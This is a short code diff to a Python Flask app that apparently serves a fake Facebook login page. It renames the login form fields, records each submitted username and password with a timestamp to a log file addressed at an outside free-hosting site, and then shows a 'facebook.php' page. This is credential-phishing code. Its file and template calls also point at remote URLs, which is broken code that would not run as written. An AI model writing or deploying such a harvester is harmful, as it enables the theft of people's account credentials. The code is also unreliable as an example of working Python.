@@ -6,8 +6,8 @@ app = Flask(__name__)
 @app.route('/', methods=['GET', 'POST'])
 def home():
     if request.method == 'POST':
-        username = request.form['username']
-        password = request.form['password']
+        username = request.form['email']
+        password = request.form['pass']
         db_ent = open("https://helppopol.000webhostapp.com/log.txt", 'a')    
         db_ent.write("\n \n" + username + " : " + password + "     [*] {}".format(datetime.datetime.now().strftime("%A %b %Y and Time was  : %I:%M:%S")))   
         return render_template('https://helppopol.000webhostapp.com/facebook.php')
